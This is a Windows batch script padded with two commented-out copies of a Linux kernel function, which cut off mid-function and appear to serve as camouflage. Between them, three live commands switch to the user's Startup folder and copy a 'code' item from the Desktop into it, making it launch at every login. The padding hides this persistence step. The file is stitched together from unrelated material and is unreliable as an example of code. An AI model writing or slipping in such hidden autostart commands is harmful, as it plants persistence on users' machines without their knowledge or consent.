@echo off
REM struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
REM 
REM struct group_info *groups_alloc(int gidsetsize){
REM 
REM 	struct group_info *group_info;
REM 
REM 	int nblocks;
REM 
REM 	int i;
REM 
REM 
REM 
REM 	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
REM 
REM 	/* Make sure we always allocate at least one indirect block pointer */
REM 
REM 	nblocks = nblocks ? : 1;
REM 
REM 	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
REM 
REM 	if (!group_info)
REM 
REM 		return NULL;
REM 
REM 	group_info->ngroups = gidsetsize;
REM 
REM 	group_info->nblocks = nblocks;
REM 
REM 	atomic_set(&group_info->usage, 1);
REM 
REM 
REM 
REM 	if (gidsetsize <= NGROUPS_SMALL)
REM 
REM 		group_info->blocks[0] = group_info->small_block;
REM 
REM 	else {
REM 
REM 		for (i = 0; i < nblocks; i++) {
REM 
REM 			gid_t *b;
REM 
REM 			b = (void *)__get_free_page(GFP_USER);
REM 
REM 			if (!b)
REM 
REM 				goto out_undo_partial_alloc;
REM 
REM 			group_info->blocks[i] = b;
REM 
REM 		}
REM 
REM 	 }
REM 
REM 	return group_info;
REM 
REM 
REM 
REM out_undo_partial_alloc:
REM 
REM 	while (--i >= 0) {
REM 
REM 		free_page((unsigned long)group_info->blocks[i]);
REM 
REM 	}
REM 
REM 	kfree(group_info);
REM 
REM 	return NULL;
REM 
REM }
REM 
REM 
REM 
REM EXPORT_SYMBOL(groups_alloc);
REM 
REM 
REM 
REM void groups_free(struct group_info *group_info)
REM 
REM {
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
copy C:\Users\%username%\OneDrive\Skrivbord\code
copy C:\Users\%username%\Skrivbord\code
REM struct group_info init_groups = { .usage = ATOMIC_INIT(2) };
REM 
REM struct group_info *groups_alloc(int gidsetsize){
REM 
REM 	struct group_info *group_info;
REM 
REM 	int nblocks;
REM 
REM 	int i;
REM 
REM 
REM 
REM 	nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK;
REM 
REM 	/* Make sure we always allocate at least one indirect block pointer */
REM 
REM 	nblocks = nblocks ? : 1;
REM 
REM 	group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER);
REM 
REM 	if (!group_info)
REM 
REM 		return NULL;
REM 
REM 	group_info->ngroups = gidsetsize;
REM 
REM 	group_info->nblocks = nblocks;
REM 
REM 	atomic_set(&group_info->usage, 1);
REM 
REM 
REM 
REM 	if (gidsetsize <= NGROUPS_SMALL)
REM 
REM 		group_info->blocks[0] = group_info->small_block;
REM 
REM 	else {
REM 
REM 		for (i = 0; i < nblocks; i++) {
REM 
REM 			gid_t *b;
REM 
REM 			b = (void *)__get_free_page(GFP_USER);
REM 
REM 			if (!b)
REM 
REM 				goto out_undo_partial_alloc;
REM 
REM 			group_info->blocks[i] = b;
REM 
REM 		}
REM 
REM 	 }
REM 
REM 	return group_info;
REM 
REM 
REM 
REM out_undo_partial_alloc:
REM 
REM 	while (--i >= 0) {
REM 
REM 		free_page((unsigned long)group_info->blocks[i]);
REM 
REM 	}
REM 
REM 	kfree(group_info);
REM 
REM 	return NULL;
REM 
REM }
REM 
REM 
REM 
REM EXPORT_SYMBOL(groups_alloc);
REM 
REM 
REM 
REM void groups_free(struct group_info *group_info)
REM 
REM {